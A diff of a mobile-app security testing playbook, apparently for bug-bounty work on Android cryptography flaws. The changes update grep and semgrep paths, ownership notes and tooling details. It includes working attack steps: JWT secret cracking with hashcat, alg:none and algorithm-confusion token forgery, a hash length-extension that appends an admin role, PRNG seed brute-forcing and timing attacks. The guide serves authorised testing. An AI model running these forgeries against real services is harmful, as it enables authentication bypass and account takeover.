-grep -rnE 'PURPOSE_(ENCRYPT|DECRYPT|SIGN|VERIFY|WRAP_KEY|AGREE_KEY)' out/sources/
+semgrep --no-git-ignore --metrics=off -c "$MASTG_RULES"/mastg-android-asymmetric-key-pair-used-for-multiple-purposes.yml "$DEC/jadx/sources"   # --no-git-ignore: a gitignored decompiled tree otherwise scans 1 file and exits 0 (D12-001)
+grep -rn 'KeyGenParameterSpec\.Builder(' $DEC/jadx/sources/ -A6
+grep -rnE 'PURPOSE_(ENCRYPT|DECRYPT|SIGN|VERIFY|WRAP_KEY|AGREE_KEY|ATTEST_KEY)' $DEC/jadx/sources/
 ```
-  `PURPOSE_ENCRYPT=1`, `PURPOSE_DECRYPT=2`, `PURPOSE_SIGN=4`, `PURPOSE_VERIFY=8`, `PURPOSE_WRAP_KEY=32`.
-  Acceptable values: `1`, `2`, `4`, `8`, `32`, `3` (encrypt|decrypt), `12` (sign|verify). **`15` = all four
-  = fails.** The runtime counterpart correlates operations by alias:
+  `PURPOSE_ENCRYPT=1`, `PURPOSE_DECRYPT=2`, `PURPOSE_SIGN=4`, `PURPOSE_VERIFY=8`, `PURPOSE_WRAP_KEY=32` (API 28),
+  `PURPOSE_AGREE_KEY=64` (API 31), `PURPOSE_ATTEST_KEY=128` (API 31). Acceptable: a value drawn from ONE role group —
+  {1, 2, 3}, {4, 8, 12}, {32}, {64}, {128}. Any value mixing two groups (e.g. `15`, `6`, `67`, `132`) fails; an attest
+  key (128) that also signs (4) is the worst shape, because it signs attestations for other keys. The runtime
+  counterpart correlates operations by alias:
 ```javascript
 Java.perform(function () {
   var C = Java.use('javax.crypto.Cipher'), S = Java.use('java.security.Signature');
@@ -1185,6 +1247,7 @@ Java.perform(function () {
 | **VRT** | `cryptographic_weakness.key_reuse.inter_environment` (**P2**, CWE-323) — this is the chapter's crypto-native ceiling |
 | **Attacker** | AM-01 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | Bugcrowd VRT 2026-07-08; note the sibling `key_reuse.intra_environment` is **P5** — establish which you have before submitting, the gap is enormous |
 
 - **Test:** Compare key material across build flavours, across the production and staging APKs, and across
@@ -1200,7 +1263,7 @@ for apk in prod.apk staging.apk beta_2023.apk; do
 done
 diff <(...prod keys...) <(...staging keys...)
 # does the app switch environments by host only, keeping the key?
-grep -rnE 'BuildConfig\.(DEBUG|FLAVOR|BUILD_TYPE)|staging|\.dev\.|sandbox' out/sources/ -B6 -A6 | grep -in 'key\|secret'
+grep -rnE 'BuildConfig\.(DEBUG|FLAVOR|BUILD_TYPE)|staging|\.dev\.|sandbox' $DEC/jadx/sources/ -B6 -A6 | grep -in 'key\|secret'
 ```
 - **Proof:** The identical key constant present in two different environments' builds, **and** a ciphertext
   produced by the production app decrypted with the key extracted from the staging build (or vice versa) —
@@ -1228,11 +1291,11 @@ grep -rnE 'BuildConfig\.(DEBUG|FLAVOR|BUILD_TYPE)|staging|\.dev\.|sandbox' out/s
 ```bash
 # two independent installs, two devices
 for s in emulator-5554 emulator-5556; do
-  adb -s $s shell run-as com.target.app sh -c 'cat shared_prefs/*.xml files/*key* 2>/dev/null' > keys_$s.txt
+  adb -s "$s" shell "$AS 'cat /data/data/$PKG/shared_prefs/*.xml /data/data/$PKG/files/*key* 2>/dev/null'" > "keys_$s.txt"
 done
 diff keys_emulator-5554.txt keys_emulator-5556.txt && echo "IDENTICAL KEY MATERIAL ACROSS INSTALLS"
 # and the strong static signal: no Keystore usage at all next to a static constant
-grep -rn 'KeyGenParameterSpec\|KeyStore\.getInstance("AndroidKeyStore")\|generateKey(' out/sources/
+grep -rn 'KeyGenParameterSpec\|KeyStore\.getInstance("AndroidKeyStore")\|generateKey(' $DEC/jadx/sources/
 ```
 - **Proof:** Identical key material on two independent installs, **and** a successful decryption of device
   B's stored blob with the key extracted from device A.
@@ -1250,6 +1313,7 @@ grep -rn 'KeyGenParameterSpec\|KeyStore\.getInstance("AndroidKeyStore")\|generat
 | **VRT** | `cryptographic_weakness.key_reuse.intra_environment` (P5); High only when you recover the key from the weak context and use it in the strong one |
 | **Attacker** | AM-01 / AM-08 |
 | **Applies to** | all |
+| **Requires** | frida, device |
 | **Maps to** | Hrishikesh "Some Other Checks" #1 ("the application doesn't reuse the same cryptographic key for multiple purposes") |
 
 - **Test:** One key for local DB encryption, token signing, transport protection and integrity means the
@@ -1258,8 +1322,8 @@ grep -rn 'KeyGenParameterSpec\|KeyStore\.getInstance("AndroidKeyStore")\|generat
 - **How:**
 ```bash
 # build the alias→callsite map
-grep -rnoE '"[A-Za-z0-9_.-]{4,40}"' out/sources/ --include='*Crypto*' --include='*Key*' | sort | uniq -c | sort -rn | head
-grep -rn 'getKey("\|getEntry("\|KeyGenParameterSpec\.Builder("' out/sources/ -A2
+grep -rnoE '"[A-Za-z0-9_.-]{4,40}"' $DEC/jadx/sources/ --include='*Crypto*' --include='*Key*' | sort | uniq -c | sort -rn | head
+grep -rn 'getKey("\|getEntry("\|KeyGenParameterSpec\.Builder("' $DEC/jadx/sources/ -A2
 ```
   Then hook `KeyStore.getKey` (D12-004) and record the alias immediately preceding each `Cipher.doFinal`,
   `Mac.doFinal` and `Signature.sign` to build the map empirically.
@@ -1278,6 +1342,7 @@ grep -rn 'getKey("\|getEntry("\|KeyGenParameterSpec\.Builder("' out/sources/ -A2
 | **VRT** | `cryptographic_weakness.insufficient_entropy.predictable_prng_seed` (P4) / `.small_seed_space_in_prng` (P4) / `.limited_rng_entropy_source` (P4); exit via `broken_authentication_and_session_management.two_fa_bypass` (P3) → `.authentication_bypass` (P1) when the predicted value is an OTP or a session id |
 | **Attacker** | AM-01 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASTG-TEST-0204, MASWE-0012 (CWE-330/332/337/338), MASTG-KNOW-0013, MASTG-BEST-0001, rule `mastg-android-random-apis-insufficient-entropy`; MobSF `android_insecure_random`; ASI "Unsafe Encryption" campaign (2019-09-17, `faqs/answer/9450925`) |
 
 - **Test:** `java.util.Random` is a 48-bit linear congruential generator; given the seed the whole sequence
@@ -1285,10 +1350,10 @@ grep -rn 'getKey("\|getEntry("\|KeyGenParameterSpec\.Builder("' out/sources/ -A2
   `java.util.Random`. Any token, nonce, IV, OTP, session id or PIN from it is predictable.
 - **How:**
 ```bash
-semgrep -c rules/mastg-android-random-apis-insufficient-entropy.yml out/sources/
-grep -rnE 'new java\.util\.Random|new Random\(|Math\.random\(\)|ThreadLocalRandom' out/sources/ \
+semgrep --no-git-ignore --metrics=off -c "$MASTG_RULES"/mastg-android-random-apis-insufficient-entropy.yml "$DEC/jadx/sources"   # --no-git-ignore: a gitignored decompiled tree otherwise scans 1 file and exits 0 (D12-001)
+grep -rnE 'new java\.util\.Random|new Random\(|Math\.random\(\)|ThreadLocalRandom' $DEC/jadx/sources/ \
   | grep -viE 'animation|shuffle|jitter|ui|sample'
-grep -rn 'SecureRandom' out/sources/          # its ABSENCE at a security sink is the finding
+grep -rn 'SecureRandom' $DEC/jadx/sources/          # its ABSENCE at a security sink is the finding
 ```
   Follow every hit forward with jadx xrefs to see whether it reaches a key, IV, nonce, token, session id,
   password or PIN, and confirm at runtime with a backtrace:
@@ -1329,14 +1394,15 @@ for lo in range(1 << 16):
 | **VRT** | `cryptographic_weakness.insufficient_entropy.small_seed_space_in_prng` (P4) / `.limited_rng_entropy_source` (P4) |
 | **Attacker** | AM-01 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASTG-TEST-0205 (Non-random Sources Usage), MASWE-0012, MASTG-KNOW-0013, rule `mastg-android-non-random-use` |
 
 - **Test:** The same impact class as D12-033 but harder to grep: `System.currentTimeMillis()`,
   `new Date().getTime()`, `Calendar.MILLISECOND`, `nanoTime()`, or an incrementing counter used as entropy.
 - **How:**
 ```bash
-semgrep -c rules/mastg-android-non-random-use.yml out/sources/
-grep -rnE 'currentTimeMillis\(\)|new Date\(\)\.getTime\(\)|Calendar\.MILLISECOND|nanoTime\(\)|SystemClock\.(uptimeMillis|elapsedRealtime)' out/sources/ -B4 -A4 \
+semgrep --no-git-ignore --metrics=off -c "$MASTG_RULES"/mastg-android-non-random-use.yml "$DEC/jadx/sources"   # --no-git-ignore: a gitignored decompiled tree otherwise scans 1 file and exits 0 (D12-001)
+grep -rnE 'currentTimeMillis\(\)|new Date\(\)\.getTime\(\)|Calendar\.MILLISECOND|nanoTime\(\)|SystemClock\.(uptimeMillis|elapsedRealtime)' $DEC/jadx/sources/ -B4 -A4 \
   | grep -inE 'token|nonce|iv|salt|otp|session|id|key|uuid'
 ```
   Then brute the plausible window — you usually know the request's timestamp to within a second from your
@@ -1363,15 +1429,16 @@ for t in range(t0 - 5000, t0 + 5000):
 | **VRT** | `cryptographic_weakness.insufficient_entropy.predictable_prng_seed` (P4); `.prng_seed_reuse` (**P5**) |
 | **Attacker** | AM-01 |
 | **Applies to** | all; the historic `SecureRandom`/`Crypto` provider seeding defect is **LEGACY** and affects only very old releases — the modern finding is the app's own explicit seeding |
+| **Requires** | — |
 | **Maps to** | Oversecured crypto patterns A–C; QARK `crypto/setting_secure_random_seed.py` (`INSECURE_FUNCTIONS = ("setSeed", "generateSeed")`); MASWE-0012, MASWE-0013 |
 
 - **Test:** Three distinct shapes, all producing reproducible keys: (a) `new SecureRandom("seed".getBytes())`,
   (b) key bytes filled from `new Random()`, (c) `byte[] key = new byte[32]` used uninitialised — all zeros.
 - **How:**
 ```bash
-grep -rn 'new SecureRandom(' out/sources/ -A2 | grep -v 'new SecureRandom()'
-grep -rn 'setSeed(\|generateSeed(' out/sources/ -B4 -A2
-grep -rnE 'new byte\[(16|24|32|64|128)\]' out/sources/ -A6 | grep -n 'SecretKeySpec\|IvParameterSpec\|KeyGenerator'
+grep -rn 'new SecureRandom(' $DEC/jadx/sources/ -A2 | grep -v 'new SecureRandom()'
+grep -rn 'setSeed(\|generateSeed(' $DEC/jadx/sources/ -B4 -A2
+grep -rnE 'new byte\[(16|24|32|64|128)\]' $DEC/jadx/sources/ -A6 | grep -n 'SecretKeySpec\|IvParameterSpec\|KeyGenerator'
 ```
 ```javascript
 Java.perform(function () {
@@ -1409,14 +1476,16 @@ Java.perform(function () {
 ```bash
 # force the restart and record the moment
 adb shell am force-stop com.target.app
-date +%s%3N; adb shell monkey -p com.target.app -c android.intent.category.LAUNCHER 1; date +%s%3N
+now_ms () { python3 -c 'import time;print(int(time.time()*1000))'; }   # `date +%s%3N` is GNU-only; macOS prints the literal 3N
+T0=$(now_ms); adb shell monkey -p com.target.app -c android.intent.category.LAUNCHER 1; T1=$(now_ms)
+adb shell ps -o PID,ETIME,NAME | grep com.target.app              # process start on the device's clock
 adb shell dumpsys activity processes | grep -A3 com.target.app   # process start time
 # or use a crash primitive from D04/D05 to restart it on demand
 adb shell am start -n com.target.app/.EntryActivity --es payload ''
 ```
 ```python
 import java_random   # or reimplement the LCG
-lo, hi = t_before, t_after           # millisecond bounds captured above
+lo, hi = T0, T1                      # millisecond bounds captured above (now_ms)
 for seed in range(lo, hi + 1):
     r = java_random.Random(seed)
     if r.nextInt(1000000) == observed_challenge:
@@ -1425,7 +1494,8 @@ for seed in range(lo, hi + 1):
 - **Proof:** You predict the challenge/nonce and the server or app accepts your response — succeeding on
   the **first** attempt after seed recovery is what makes it a prediction rather than a brute force.
 - **Escalation:** Pairs with any restart oracle in D04/D05; that pairing is what makes the seed recoverable
-  in practice.
+  in practice. Restart primitive: owner D04-062; receiver challenge-response seeded from wall-clock time: owner
+  D05-021 — D12 owns the seed-recovery arithmetic only.
 - **Ruled out when:** The generator is seeded from `SecureRandom` or re-seeded per operation, or the value
   is server-issued. If the app uses `java.util.Random` but you have no way to observe or force the start
   moment, say so — the item is present but unproven, which is Informational, not Medium.
@@ -1442,12 +1512,13 @@ for seed in range(lo, hi + 1):
 | **Maps to** | H1 #824931 (Grammarly, Medium 6.5, CWE "Use of Cryptographically Weak PRNG"; the fix was "moving from PRNG to `SecureRandom`") |
 
 - **Test:** PKCE only protects the code if the verifier is unguessable. A predictable verifier means a
-  malicious app that intercepts the code (D09) can complete the exchange.
+  malicious app that intercepts the code (D09) can complete the exchange. Owner: D09-030 (the PRNG finding and the
+  interception half) — D12 adds only the `SecureRandom` slice check below; record `covered-by D09-030` when D09 ran first.
 - **How:**
 ```bash
-grep -rn 'code_verifier\|codeVerifier\|code_challenge\|"S256"' out/sources/ -B10 \
+grep -rn 'code_verifier\|codeVerifier\|code_challenge\|"S256"' $DEC/jadx/sources/ -B10 \
   | grep -nE 'new Random|Math\.random|System\.currentTimeMillis|nanoTime|ThreadLocalRandom|UUID\.randomUUID'
-grep -rn 'SecureRandom' out/sources/       # the correct construction, to confirm ABSENT on this path
+grep -rn 'SecureRandom' $DEC/jadx/sources/       # the correct construction, to confirm ABSENT on this path
 ```
   Capture two authorisation requests and compare the `code_challenge` values for structure; reproduce the
   verifier offline from the observable seed.
@@ -1467,6 +1538,7 @@ grep -rn 'SecureRandom' out/sources/       # the correct construction, to confir
 | **VRT** | n/a (false-positive discipline governing D12-018, D12-033 → D12-037) |
 | **Attacker** | AM-12 (harness) |
 | **Applies to** | every randomness, timing or oracle claim |
+| **Requires** | — |
 | **Maps to** | the Statistical-Sample Rule; the Shell-Loop Ban; the Body-Diff Rule |
 
 - **Test:** Single outliers are not signal, and a sweep that silently ate half its iterations looks exactly
@@ -1499,6 +1571,7 @@ grep -rn 'SecureRandom' out/sources/       # the correct construction, to confir
 | **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.identity_check_value` (P4) for a non-cryptographic ICV; `.cryptographic_signature` (varies — by impact) for a forged MAC |
 | **Attacker** | AM-01 |
 | **Applies to** | all |
+| **Requires** | — |
 | **Maps to** | MASWE-0009 (CWE-208/323/327/354/807), MASWE-0008, NIST SP 800-224, NIST SP 800-131A Rev 2, RFC 6151. **No Android MASTG-TEST covers MAC misuse — cite this as a MASTG gap** |
 
 - **Test:** Where the app authenticates messages or stored data, inspect the construction rather than the
@@ -1508,11 +1581,11 @@ grep -rn 'SecureRandom' out/sources/       # the correct construction, to confir
   observable verification failures.
 - **How:**
 ```bash
-grep -rnE 'javax\.crypto\.Mac|Mac\.getInstance\("Hmac(MD5|SHA1)"\)|CRC32|Adler32|checksum' out/sources/ -B6 -A6
+grep -rnE 'javax\.crypto\.Mac|Mac\.getInstance\("Hmac(MD5|SHA1)"\)|CRC32|Adler32|checksum' $DEC/jadx/sources/ -B6 -A6
 # the length-extension shape: digest.update(key); digest.update(message); digest.digest()
-grep -rn 'MessageDigest' out/sources/ -A8 | grep -nE '\.update\(.*key|\.update\(.*secret'
-grep -rn 'copyOf(\|copyOfRange(\|substring(0,' out/sources/ -B4 | grep -in 'mac\|tag\|hmac\|digest'   # truncation
-grep -rn 'Mac\.getInstance' out/sources/ -A15 | grep -nE 'doFinal|nonce|timestamp|sequence'           # replay fields
+grep -rn 'MessageDigest' $DEC/jadx/sources/ -A8 | grep -nE '\.update\(.*key|\.update\(.*secret'
+grep -rn 'copyOf(\|copyOfRange(\|substring(0,' $DEC/jadx/sources/ -B4 | grep -in 'mac\|tag\|hmac\|digest'   # truncation
+grep -rn 'Mac\.getInstance' $DEC/jadx/sources/ -A15 | grep -nE 'doFinal|nonce|timestamp|sequence'           # replay fields
 ```
   For a confirmed `hash(key‖msg)`:
 ```bash
@@ -1536,6 +1609,7 @@ hash_extender --data 'user=alice&role=user' --secret 32 --append '&role=admin' \
 | **VRT** | `cryptographic_weakness.side_channel_attack.timing_attack` (P4) |
 | **Attacker** | AM-01 (remote, against the server-side comparator) / AM-03 (local, against the app's) |
 | **Applies to** | all |
+| **Requires** | backend-api, mitm |
 | **Maps to** | MASWE-0009 (CWE-208 Observable Timing Discrepancy) |
 
 - **Test:** `Arrays.equals` and `String.equals` short-circuit on the first differing byte. Where the
@@ -1543,8 +1617,8 @@ hash_extender --data 'user=alice&role=user' --secret 32 --append '&role=admin' \
   byte.
 - **How:**
 ```bash
-grep -rn 'MessageDigest\.isEqual' out/sources/          # the correct API — note its ABSENCE
-grep -rn 'Arrays\.equals(\|\.equals(' out/sources/ -B6 | grep -inE 'mac|tag|hmac|signature|digest|token|otp'
+grep -rn 'MessageDigest\.isEqual' $DEC/jadx/sources/          # the correct API — note its ABSENCE
+grep -rn 'Arrays\.equals(\|\.equals(' $DEC/jadx/sources/ -B6 | grep -inE 'mac|tag|hmac|signature|digest|token|otp'
 ```
   Measure with the interleaved harness from D12-038 — never a single shot, and never in a shell loop:
 ```python
@@ -1574,6 +1648,7 @@ for b in groups:
 | **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies — by impact); exit to `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) or `broken_authentication_and_session_management.authentication_bypass` (P1) |
 | **Attacker** | AM-01 |
 | **Applies to** | all apps that HMAC or sign requests |
+| **Requires** | backend-api, mitm |
 | **Maps to** | ATT&CK T1641.001 (Transmitted Data Manipulation), T1521; MASWE-0009 |
 
 - **Test:** If the app signs requests, three questions decide everything, and all three are answered on the
@@ -1581,7 +1656,7 @@ for b in groups:
   to a nonce or timestamp?
 - **How:**
 ```bash
-grep -rniE 'hmac|Mac\.getInstance|x-sign|x-signature|x-nonce|x-timestamp|checksum|sign\(' out/sources/ -B6 -A6
+grep -rniE 'hmac|Mac\.getInstance|x-sign|x-signature|x-nonce|x-timestamp|checksum|sign\(' $DEC/jadx/sources/ -B6 -A6
 ```
 ```bash
 T='Bearer <live token>'
@@ -1617,6 +1692,7 @@ diff /tmp/c1 /tmp/c2
 | **VRT** | `cryptographic_weakness.insufficient_verification_of_data_authenticity.cryptographic_signature` (varies, CWE-347); `insecure_data_transport.executable_download.no_secure_integrity_check` (P4, CWE-353/354/494) when it is an update channel |
 | **Attacker** | AM-09 (malicious backend/CDN) / AM-06 (network) / AM-01 |
 | **Applies to** | all — in-app update manifests, remote config, OTA bundles, licence blobs, push payloads, downloaded models |
+| **Requires** | backend-api, mitm |
 | **Maps to** | MASWE-0009; `developer.android.com/privacy-and-security/risks/unsafe-trustmanager`, `.../unsafe-hostname`; HackerOne Platform Standards AITM baseline `CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` = High |
 
 - **Test:** This is the scope's "signature verification the app performs on data it trusts". Three failure
@@ -1625,19 +1701,16 @@ diff /tmp/c1 /tmp/c2
   parsed, loaded or written.
 - **How:**
 ```bash
-grep -rn 'java\.security\.Signature\|initVerify\|\.verify(' out/sources/ -B6 -A15
+grep -rn 'java\.security\.Signature\|initVerify\|\.verify(' $DEC/jadx/sources/ -B6 -A15
 # the discarded-boolean shape: verify() whose result is not the subject of an if / assert / throw
-grep -rn '\.verify(' out/sources/ -A3 | grep -vE 'if *\(|return |throw |assert|\?|&&|\|\|'
+grep -rn '\.verify(' $DEC/jadx/sources/ -A3 | grep -vE 'if *\(|return |throw |assert|\?|&&|\|\|'
 # the key-from-the-payload shape
-grep -rn 'generatePublic\|X509EncodedKeySpec\|KeyFactory\.getInstance' out/sources/ -B10 | grep -inE 'payload|manifest|response|json|getString'
-# the empty TrustManager cousin
-grep -rn -A15 'checkServerTrusted\|checkClientTrusted\|X509TrustManager' out/sources/
-grep -rn 'ALLOW_ALL_HOSTNAME_VERIFIER\|setHostnameVerifier\|HostnameVerifier' out/sources/
+grep -rn 'generatePublic\|X509EncodedKeySpec\|KeyFactory\.getInstance' $DEC/jadx/sources/ -B10 | grep -inE 'payload|manifest|response|json|getString'
+# the empty TrustManager / HostnameVerifier cousin is NOT re-run here — TLS trust decisions: owner D14-007 (cite its log)
 # order of operations: is the write/load before the verify?
-grep -rn 'DexClassLoader\|PathClassLoader\|FileOutputStream\|Runtime\.getRuntime' out/sources/ -B20 | grep -n 'verify('
+grep -rn 'DexClassLoader\|PathClassLoader\|FileOutputStream\|Runtime\.getRuntime' $DEC/jadx/sources/ -B20 | grep -n 'verify('
 ```
-- **Proof:** The decompiled method body showing the discarded boolean (or the empty `checkServerTrusted`
-  with a bare `return-void`), **plus** the app accepting an artefact you signed with your own key — a
+- **Proof:** The decompiled method body showing the discarded boolean, **plus** the app accepting an artefact you signed with your own key — a
   modified config, an unsigned update, a substituted model file — and acting on it.
 - **Escalation:** → D17 (dynamic code loading / malicious update → code execution in the app's UID), D21
   (client integrity check defeated), D14 (if it is the TLS trust decision).
@@ -1654,6 +1727,7 @@ grep -rn 'DexClassLoader\|PathClassLoader\|FileOutputStream\|Runtime\.getRuntime
 | **VRT** | rate the weakened control: `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1), `broken_authentication_and_session_management.authentication_bypass` (P1), or `.two_fa_bypass` (P3) |
 | **Attacker** | AM-01 |
 | **Applies to** | any app whose hardcoded base URLs carry a version segment |
+| **Requires** | backend-api, mitm |
 | **Maps to** | the shadow-API doctrine — a mobile app's hardcoded backend calls are frequently an **older** API version than the current web app uses, with weaker auth, weaker rate limits, weaker input validation and more field exposure |
 
 - **Test:** The highest-value structural idea available to a mobile crypto reviewer. The app's request
@@ -1663,8 +1737,8 @@ grep -rn 'DexClassLoader\|PathClassLoader\|FileOutputStream\|Runtime\.getRuntime
 - **How:**
 ```bash
 # 1) inventory every versioned path the binary knows about (DEX + native + bundle)
-grep -rhoE 'https?://[a-z0-9.-]+/[a-z0-9/_-]*v[0-9]+[a-z0-9/_-]*' out/sources/ | sort -u
-strings -a lib/*/*.so assets/index.android.bundle 2>/dev/null | grep -aoE '/v[0-9]+/[a-z0-9/_-]+' | sort -u
+grep -rhoE 'https?://[a-z0-9.-]+/[a-z0-9/_-]*v[0-9]+[a-z0-9/_-]*' $DEC/jadx/sources/ | sort -u
+strings -a lib/*/*.so $DEC/apktool/assets/index.android.bundle 2>/dev/null | grep -aoE '/v[0-9]+/[a-z0-9/_-]+' | sort -u
 # 2) behavioural diff — same operation, each version, with and without the signing headers
 for v in v1 v2 v3; do
   echo "== $v signed";   curl -s -o /tmp/$v.s -w '%{http_code} %{size_download}\n' \
@@ -1692,15 +1766,16 @@ for v in v1 v3; do curl -s -H "Authorization: Bearer $T" "https://api.target/$v/
 | **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1); `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
 | **Attacker** | AM-01 |
 | **Applies to** | HS256-signed sessions |
+| **Requires** | backend-api, mitm |
 | **Maps to** | `hunt-jwt-crypto` (offline attacks), SSO-JWT forged-from-weak-secret class (hackerone.com/reports/638635) |
 
 - **Test:** If the build ships the symmetric signing secret — or the secret is weak enough to recover
   offline from a captured token — every identity in the system is forgeable with no credential.
 - **How:**
 ```bash
-strings -a classes*.dex lib/*/*.so assets/* 2>/dev/null > strings_pkg.txt
+strings -a $DEC/dex/classes*.dex $DEC/apktool/lib/*/*.so $DEC/apktool/assets/* 2>/dev/null > strings_pkg.txt
 grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' strings_pkg.txt | sort -u
-grep -rniE 'jwtSecret|signingKey|HS256|SignatureAlgorithm\.HS|Jwts\.builder|io\.jsonwebtoken|Keys\.hmacShaKeyFor' out/sources/ -B6 -A6
+grep -rniE 'jwtSecret|signingKey|HS256|SignatureAlgorithm\.HS|Jwts\.builder|io\.jsonwebtoken|Keys\.hmacShaKeyFor' $DEC/jadx/sources/ -B6 -A6
 # offline recovery from a captured token
 hashcat -a 0 -m 16500 token.txt rockyou.txt
 jwt_tool <token> -C -d wordlist.txt
@@ -1709,7 +1784,8 @@ jwt_tool <token> -C -d wordlist.txt
   you cannot otherwise reach — with the account or tenant identifier in the response proving it is not
   yours.
 - **Escalation:** → D13 (arbitrary identity), D15 (admin API), and per the chain-filing rule the secret
-  extraction is filed first as its own primitive so the consumer report can reference its id.
+  extraction is filed first as its own primitive so the consumer report can reference its id. The server battery
+  (alg/key/claim probes against every host) is owned by D13-027 — hand it the recovered secret rather than re-running it.
 - **Ruled out when:** No JWT in the package, or the algorithm is asymmetric and the app holds only the
   public key, or `hashcat -m 16500` over a large wordlist plus the DEX/native string corpus fails to
   recover the secret. Record the wordlist size and the runtime.
@@ -1722,6 +1798,7 @@ jwt_tool <token> -C -d wordlist.txt
 | **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) |
 | **Attacker** | AM-01 |
 | **Applies to** | RS256-signed tokens with a reachable public key (a JWKS endpoint, or a PEM shipped in the app) |
+| **Requires** | backend-api, mitm |
 | **Maps to** | `hunt-jwt-crypto` — algorithm confusion on a `v1` API (hackerone.com/reports/3800870, $1,337); `hunt-api-misconfig` §12 |
 
 - **Test:** The verifier trusts the token's own `alg` header instead of pinning the algorithm server-side.
@@ -1730,15 +1807,18 @@ jwt_tool <token> -C -d wordlist.txt
 - **How:**
 ```bash
 # get the public key: from the app, or from the JWKS, or recover it from two captured tokens
-grep -rn -- '-----BEGIN PUBLIC KEY' out/res/raw/* out/assets/* 2>/dev/null
+grep -rn -- '-----BEGIN PUBLIC KEY' $DEC/apktool/res/raw/* $DEC/apktool/assets/* 2>/dev/null
 curl -s https://api.target/.well-known/jwks.json | jq .
-docker run -it --rm silentsignal/rsa_sign2n <token1> <token2>
+docker run --rm -it portswigger/sig2n <token1> <token2>   # PortSwigger's packaging of silentsignal/rsa_sign2n (no `silentsignal/rsa_sign2n` image exists on Docker Hub); prints candidate HS256 tokens signed with each PEM/DER variant
+# or build it: git clone https://github.com/silentsignal/rsa_sign2n && cd rsa_sign2n/standalone && docker build -t sig2n . && docker run --rm -it sig2n python3 jwt_forgery.py <token1> <token2>
 jwt_tool <token> -X k -pk public.pem      # re-signs the edited payload as HS256 with the PEM as the secret
 ```
 - **Proof:** The forged token authenticating as another identity at a protected endpoint, with that
   identity's data in the response.
 - **Escalation:** Forge `role:"admin"` → admin listing → perform an admin action with the *same* token.
-  That fixed three-step sequence is what converts a signature-bypass primitive into a Critical.
+  That fixed three-step sequence is what converts a signature-bypass primitive into a Critical. D12 owns the
+  mobile-specific entry (the PEM shipped in the binary, or recovered from two tokens); the server-side confusion
+  probe itself is owned by D13-027 — hand it the PEM.
 - **Ruled out when:** The verifier rejects a token whose `alg` is `HS256` when the key is RSA, with a
   distinct error body — tested with both the raw PEM and the DER as the HMAC key, and with and without the
   trailing newline. **Pre-severity gate:** a confirmed signature-bypass primitive at the audience layer is
@@ -1760,6 +1840,8 @@ jwt_tool <token> -X k -pk public.pem      # re-signs the edited payload as HS256
   half.
 - **How:**
 ```bash
+# OWNER: D13-027 runs this battery once per engagement — do not run it twice. Record this row `covered-by D13-027` with its
+# log path and hand D13 the key/PEM recovered in D12-044/D12-045; the probes are kept here only so the D12 worker knows the shape.
 # alg:none, including case variants — some verifiers reject "none" but accept "None"/"NONE"/"nOnE"
 jwt_tool <token> -X a
 # kid path traversal to a known-content file → the HMAC key becomes the empty string
@@ -1793,17 +1875,19 @@ jwt_tool <token> -X i
 | **VRT** | `sensitive_data_exposure.disclosure_of_secrets.sensitive_information_disclosed_jwt` (**P5** for the token itself) — file the *surface map* it yields, not the token |
 | **Attacker** | AM-12 (recon) → AM-01 |
 | **Applies to** | any APK shipping a token |
+| **Requires** | — |
 | **Maps to** | `apk-redteam-pipeline` Stage 3 + Anti-patterns ("Don't trust expired JWTs as dead intel") |
 
 - **Test:** An eight-year-expired token is still intel. Its claim names tell you how to shape a forgery
   later; its `alg` tells you which attack applies; the paths around it inventory the internal API.
 - **How:**
 ```bash
-for t in $(grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' strings_pkg.txt | sort -u); do
-  echo "$t" | cut -d. -f1 | base64 -d 2>/dev/null; echo
-  echo "$t" | cut -d. -f2 | base64 -d 2>/dev/null; echo; echo ---
-done
-grep -rhoE '/v[0-9]+/[a-z0-9/_{}-]+' out/sources/ | sort -u > api_surface.txt
+# segments are base64url WITHOUT padding: plain `base64 -d` stops at the first '-'/'_' or the missing '=' and prints truncated claims
+jwtdec () { python3 -c 'import base64,sys
+for seg in sys.argv[1].split(".")[:2]: print(base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4)).decode("utf-8", "replace"))' "$1"; }
+grep -rhoE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' strings_pkg.txt | sort -u | while read -r t; do jwtdec "$t"; echo ---; done
+# or: jwt_tool "$t"   (its default mode prints header and payload)
+grep -rhoE '/v[0-9]+/[a-z0-9/_{}-]+' $DEC/jadx/sources/ | sort -u > api_surface.txt
 ```
 - **Proof:** A documented internal API surface map derived solely from the binary — claim names, the
   signing algorithm, and every versioned path the surrounding code references.
@@ -1820,17 +1904,18 @@ grep -rhoE '/v[0-9]+/[a-z0-9/_{}-]+' out/sources/ | sort -u > api_surface.txt
 | **Severity ceiling** | High |
 | **VRT** | `cryptographic_weakness.insecure_implementation.missing_cryptographic_step` (varies, CWE-325); exit to `broken_authentication_and_session_management.authentication_bypass` (P1) when it yields the session |
 | **Attacker** | AM-11 physical unlocked / AM-08 malicious SDK / AM-03 with any in-process execution primitive |
-| **Applies to** | API 23+ (`KeyGenParameterSpec`); `setUserAuthenticationParameters` is API 30+ and supersedes `setUserAuthenticationValidityDurationSeconds` |
-| **Maps to** | MASWE-0016 (Cryptographic Key Access Not Restricted, CWE-284/306 — "Assuming Hardware Implies Restriction" is called out explicitly), MASWE-0020, MASTG-TEST-0330, MASTG-TEST-0018, MASTG-KNOW-0043; AOSP keystore tags `TAG_NO_AUTH_REQUIRED`, `TAG_AUTH_TIMEOUT`, `TAG_USER_AUTH_TYPE`, `TAG_USER_SECURE_ID` |
